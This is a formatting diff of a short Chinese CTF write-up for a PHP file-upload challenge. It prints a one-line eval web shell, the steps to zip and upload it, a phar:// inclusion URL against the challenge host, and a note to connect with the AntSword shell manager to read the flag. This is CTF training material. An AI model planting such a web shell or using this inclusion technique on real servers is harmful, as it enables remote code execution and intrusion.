@@ -1,17 +1,20 @@
-#PHP  #文件上传 
+#PHP #文件上传
 
 shell.php
+
 ```php
 <?php eval(@$_POST['hack']); ?>
 ```
+
 压缩文件为 shell.zip 并上传
 
-利用 phar 
+利用 phar
+
 ```text
 http://node1.anna.nssctf.cn:28192/index.php?bingdundun=phar://76ab8b96cd88e20eca5b3d23524285b4.zip/shell
 ```
 
-此时访问 url ,用蚁剑连接，flag在根目录下，  \
+此时访问 url ,用蚁剑连接，flag 在根目录下， \
 
 [PHP: 简介 - Manual](https://www.php.net/manual/zh/intro.phar.php)
 
